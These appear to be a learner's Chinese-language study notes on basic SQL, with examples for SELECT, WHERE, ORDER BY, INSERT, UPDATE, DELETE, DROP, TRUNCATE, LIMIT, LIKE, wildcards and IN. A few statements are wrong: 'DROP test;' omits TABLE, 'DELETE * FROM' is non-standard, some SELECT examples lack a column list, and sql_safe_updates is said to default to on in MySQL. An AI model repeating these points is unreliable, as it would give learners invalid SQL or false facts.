<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">与</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-DISTINCT-语句"><a href="#SQL-SELECT-DISTINCT-语句" class="headerlink" title="SQL SELECT DISTINCT 语句"></a>SQL SELECT DISTINCT 语句</h4><p>SELECT DISTINCT 语句用于返回唯一不同的值。</p>
<p>SQL SELECT DISTINCT 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> country <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-WHERE-子句"><a href="#SQL-WHERE-子句" class="headerlink" title="SQL WHERE 子句"></a>SQL WHERE 子句</h4><p>WHERE 子句用于过滤记录。</p>
<p>SQL WHERE 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">operator</span> <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>文本字段 vs. 数值字段</p>
<p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。</p>
<p>在上个实例中 ‘CN’ 文本字段使用了单引号。</p>
<p>如果是数值字段，请不要使用引号。</p>
<h4 id="SQL-AND-amp-OR-运算符"><a href="#SQL-AND-amp-OR-运算符" class="headerlink" title="SQL AND &amp; OR 运算符"></a>SQL AND &amp; OR 运算符</h4><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span> <span class="keyword">AND</span> alexa &gt; <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE <span class="attribute">country</span>=<span class="string">'USA'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE alexa &gt; 15 <span class="keyword">AND</span> (<span class="attribute">country</span>=<span class="string">'CN'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'USA'</span>);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ORDER-BY-关键字"><a href="#SQL-ORDER-BY-关键字" class="headerlink" title="SQL ORDER BY 关键字"></a>SQL ORDER BY 关键字</h4><p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。</p>
<p>ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。</p>
<p>SQL ORDER BY 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name <span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name,column_name <span class="keyword">ASC</span>|<span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列排序：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “country” 和 “alexa” 列排序：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> country,alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列的时候，先按照第一个column name排序，在按照第二个column name排序；如上述教程最后一个例子：</p>
<ul>
<li>先将country值这一列排序，同为CN的排前面，同属USA的排后面；</li>
<li>然后在同属CN的这些多行数据中，再根据alexa值的大小排列。</li>
<li>ORDER BY 排列时，不写明ASC DESC的时候，默认是ASC。</li>
</ul>
<p>ORDER BY 多列的时候，eg:</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A,<span class="keyword">B </span>       这个时候都是默认按升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A desc,<span class="keyword">B </span>  这个时候 A 降序，<span class="keyword">B </span>升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A ,<span class="keyword">B </span>desc  这个时候 A 升序，<span class="keyword">B </span>降序排列</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-语句"><a href="#SQL-INSERT-INTO-语句" class="headerlink" title="SQL INSERT INTO 语句"></a>SQL INSERT INTO 语句</h4><p>INSERT INTO 语句用于向表中插入新记录。</p>
<p>SQL INSERT INTO 语法</p>
<p>INSERT INTO 语句可以有两种编写形式。</p>
<p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<p>INSERT INTO <em>table_name</em><br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>第二种形式需要指定列名及被插入的值：</p>
<p>INSERT INTO <em>table_name</em> (<em>column1</em>,<em>column2</em>,<em>column3</em>,…)<br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>INSERT INTO 实例</p>
<p>假设我们要向 “Websites” 表中插入一个新行。</p>
<p>我们可以使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, <span class="keyword">url</span>, alexa, country) <span class="keyword">VALUES</span> (<span class="string">'百度'</span>,<span class="string">'https://www.baidu.com/'</span>,<span class="string">'4'</span>,<span class="string">'CN'</span>);</span><br></pre></td></tr></table></figure>

<p>在指定的列插入数据</p>
<p>我们也可以在指定的列插入数据。</p>
<p>下面的 SQL 语句将插入一个新行，但是只在 “name”、”url” 和 “country” 列插入数据（id 字段会自动更新）：</p>
<p>（alex值为0）</p>
<p>没有指定要插入数据的列名的形式需要列出插入行的每一列数据:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name</span><br><span class="line"><span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>

<p>insert into select 和select into from 的区别（不是很懂，没有见过这么操作的，待解决）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> scorebak <span class="keyword">select</span> * <span class="keyword">from</span> socre <span class="keyword">where</span> neza=<span class="string">'neza'</span>   <span class="comment">--插入一行,要求表scorebak 必须存在</span></span><br><span class="line"><span class="keyword">select</span> *  <span class="keyword">into</span> scorebak <span class="keyword">from</span> score  <span class="keyword">where</span> neza=<span class="string">'neza'</span>  <span class="comment">--也是插入一行,要求表scorebak 不存在</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-UPDATE-语句"><a href="#SQL-UPDATE-语句" class="headerlink" title="SQL UPDATE 语句"></a>SQL UPDATE 语句</h4><p>UPDATE 语句用于更新表中已存在的记录。</p>
<p>SQL UPDATE 语法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">column1</span>=value1,column2=value2,...</span><br><span class="line">WHERE <span class="attribute">some_column</span>=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL UPDATE 实例</p>
<p>假设我们要把 “菜鸟教程” 的 alexa 排名更新为 5000，country 改为 USA。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites  <span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span>  WHERE <span class="attribute">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<p>Update 警告！</p>
<p>在更新记录时要格外小心！在上面的实例中，如果我们省略了 WHERE 子句，如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span></span><br></pre></td></tr></table></figure>

<p>执行以上代码会将 Websites 表中所有数据的 alexa 改为 5000，country 改为 USA。</p>
<p>执行没有 WHERE 子句的 UPDATE 要慎重，再慎重。</p>
<p>SQL DELETE 语句</p>
<p>DELETE 语句用于删除表中的行。</p>
<h4 id="SQL-DELETE-语法"><a href="#SQL-DELETE-语法" class="headerlink" title="SQL DELETE 语法"></a>SQL DELETE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> some_column=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL DELETE 实例</p>
<p>假设我们要从 “Websites” 表中删除网站名为 “百度” 且国家为 CN 的网站 。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<p>DELETE FROM Websites WHERE name=’百度’ AND country=’CN’;</p>
<p>删除所有数据</p>
<p>您可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>SQL关于删除的三个语句：<strong>DROP</strong>、<strong>TRUNCATE</strong>、 <strong>DELETE</strong> 的区别。</p>
<p><strong>DROP:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test，并释放空间，将test删除的一干二净。</p>
<p><strong>TRUNCATE:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test里的内容，并释放空间，但不删除表的定义，表的结构还在。</p>
<p><strong>DELETE:</strong></p>
<p>1、删除指定数据</p>
<p>删除表test中年龄等于30的且国家为US的数据</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE <span class="keyword">FROM</span> test WHERE <span class="attribute">age</span>=30 <span class="keyword">AND</span> <span class="attribute">country</span>=<span class="string">'US'</span>;</span><br></pre></td></tr></table></figure>

<p>2、删除整个表</p>
<p>仅删除表test内的所有内容，保留表的定义，不释放空间。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>mysql 中可以通过参数 sql_safe_updates 来限制 update/delete，防止全表更新或删除。</p>
<p>以下 3 种情况在采用此参数的情况下都不能正常进行操作：</p>
<ul>
<li>1: 没有加where条件的全表更新操作;</li>
<li>2: 加了 where 条件字段，但是 where 字段没有走索引的表更新;</li>
<li>3: 全表 delete 没有加 where 条件或者 where 条件没有走索引。</li>
</ul>
<p>这三种情况下都会抛出异常，无法执行。</p>
<p>下面是 sql_safe_updates 变量为 0 和 1 时的取值说明：</p>
<p>sql_safe_updates 有两个取值 0 和 1， 即 off 和 on。</p>
<p>sql_safe_updates = 1 (或 sql_safe_updates = on ) 时，不带 where 和 limit 条件的 update 和 delete 操作语句是无法执行的，即使是有 where 和 limit 条件但不带 key column 限制条件的 update 和 delete 也不能执行。</p>
<p>sql_safe_updates = 0 (或 sql_safe_updates = off ) 时，无 where 和 limit 条件的 update 和 delete 操作将会顺利执行。</p>
<p>很显然，在一般的 mysql 中此参数的默认值是 1。</p>
<p>在 sql_safe_updates = on 时，采取删除或更新全表时抛出的错误码为 1175。</p>
<h4 id="SQL-SELECT-TOP-LIMIT-ROWNUM-子句"><a href="#SQL-SELECT-TOP-LIMIT-ROWNUM-子句" class="headerlink" title="SQL SELECT TOP, LIMIT, ROWNUM 子句"></a>SQL SELECT TOP, LIMIT, ROWNUM 子句</h4><p>SELECT TOP 子句用于规定要返回的记录的数目。</p>
<p>SELECT TOP 子句对于拥有数千条记录的大型表来说，是非常有用的。</p>
<p><strong>注意:</strong>并非所有的数据库系统都支持 SELECT TOP 语句。 MySQL 支持 LIMIT 语句来选取指定的条数数据， Oracle 可以使用 ROWNUM 来选取。</p>
<p>SQL Server / MS Access 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="built_in">number</span>|<span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>MySQL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="keyword">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>Oracle 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="built_in">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;=<span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>MySQL SELECT LIMIT 实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取头两条记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">LIMIT</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>SQL SELECT TOP PERCENT 实例</p>
<p>在 Microsoft SQL Server 中还可以使用百分比作为参数。</p>
<p>下面的 SQL 语句从 websites 表中选取前面百分之 50 的记录：</p>
<p>实例</p>
<p>以下操作在 Microsoft SQL Server 数据库中可执行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">50</span> <span class="keyword">PERCENT</span> * <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>变相返回后 N 行:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--前5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--后5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">desc</span>  <span class="comment">--desc 表示降序排列 asc 表示升序</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-LIKE-操作符"><a href="#SQL-LIKE-操作符" class="headerlink" title="SQL LIKE 操作符"></a>SQL LIKE 操作符</h4><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<h4 id="SQL-LIKE-语法"><a href="#SQL-LIKE-语法" class="headerlink" title="SQL LIKE 语法"></a>SQL LIKE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> pattern;</span><br></pre></td></tr></table></figure>

<p>SQL LIKE 操作符实例</p>
<p>下面的 SQL 语句选取 name 以字母 “G” 开始的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'G%'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>通过使用 NOT 关键字，您可以选取不匹配模式的记录。</p>
<p>下面的 SQL 语句选取 name 不包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>example:</p>
<p>‘%a’    //以a结尾的数据</p>
<p>‘a%’    //以a开头的数据</p>
<p>‘%a%’    //含有a的数据</p>
<p>‘<em>a</em>’    //三位且中间字母是a的</p>
<p>‘_a’    //两位且结尾字母是a的</p>
<p>‘a_’    //两位且开头字母是a的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段_%'</span>    <span class="comment">-- 会查出来段煜 段鑫</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段\_%'</span> escape <span class="string">'\'   -- 通过 \转义,只能查出来 段_煜</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-通配符"><a href="#SQL-通配符" class="headerlink" title="SQL 通配符"></a>SQL 通配符</h4><p>在 SQL 中，通配符与 SQL LIKE 操作符一起使用。</p>
<p>SQL 通配符用于搜索表中的数据。</p>
<p>在 SQL 中，可使用以下通配符：</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代 0 个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[<em>charlist</em>]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p>使用 SQL % 通配符</p>
<p>下面的 SQL 语句选取 url 以字母 “https” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">url</span> <span class="keyword">LIKE</span> <span class="string">'https%'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL _ 通配符</p>
<p>下面的 SQL 语句选取 name 以一个任意字符开始，然后是 “oogle” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'_oogle'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL [charlist] 通配符</p>
<p>MySQL 中使用 <strong>REGEXP</strong> 或 <strong>NOT REGEXP</strong> 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。</p>
<p>下面的 SQL 语句选取 name 以 “G”、”F” 或 “s” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[GFs]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 不以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[^A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>LIKE命令都涉及到的通配符：</p>
<p>% 替代一个或多个字符</p>
<p>_ 仅替代一个字符</p>
<p>[charlist] 字符列中的任何单一字符</p>
<p>[^charlist]或者[!charlist] 不在字符列中的任何单一字符</p>
<p>MySQL 和 SQLite 会把 <strong>like ‘[xxx]yyy’</strong> 的中括号当成普通字符，而不是通配符。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>将查出 <strong>city</strong> 为 <strong>[B]eijing</strong> 的行，而不是 <strong>city</strong> 为 <strong>beijing</strong> 的行。</p>
<p>MySQL 中要完成 <strong>[^charlist]</strong> 或 <strong>[!charlist]</strong> 通配符的查询效果，需要通过正则表达式来完成。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City REGEXP <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>SQLite不支持Regexp正则方法。</p>
<h4 id="SQL-IN-操作符"><a href="#SQL-IN-操作符" class="headerlink" title="SQL IN 操作符"></a>SQL IN 操作符</h4><p>SQL IN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br></pre></td></tr></table></figure>

<p>IN 操作符实例</p>
<p>下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">IN</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p><strong>IN 与 = 的异同</strong></p>
<ul>
<li>相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义</li>
<li>不同点：IN可以规定多个值，等于规定一个值</li>
</ul>
<p>in 与 = 的转换**</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">in</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p>可以转换成 <strong>=</strong> 的表达：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'Google'</span> <span class="keyword">or</span> <span class="keyword">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-BETWEEN-操作符"><a href="#SQL-BETWEEN-操作符" class="headerlink" title="SQL BETWEEN 操作符"></a>SQL BETWEEN 操作符</h4><p>BETWEEN 操作符选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</p>
